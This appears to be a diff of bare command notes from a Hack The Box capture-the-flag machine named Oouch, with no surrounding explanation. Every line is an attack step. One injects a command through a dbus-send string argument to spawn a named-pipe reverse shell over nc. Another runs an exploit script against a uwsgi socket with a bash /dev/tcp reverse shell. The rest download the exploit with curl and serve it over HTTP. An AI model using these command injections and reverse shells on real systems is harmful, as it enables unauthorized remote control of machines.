@@ -1,0 +1,13 @@
+ 
+ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block "string:;rm /tmp/.0; mkfifo /tmp/.0; cat /tmp/.0 | /bin/bash -i 2>&1 | nc 172.18.0.5 6002>/tmp/.0;"
+
+ 
+ 
+ python exploit.py -m unix -u /tmp/uwsgi.socket -c "bash -c 'bash -i>& /dev/tcp/10.10.10.177/1234 0>&1'"
+
+ 
+ curl http://10.10.14.48/exploit.py -o exploit.py
+ 
+ 
+ python -m SimpleHTTPServer 80
+ 
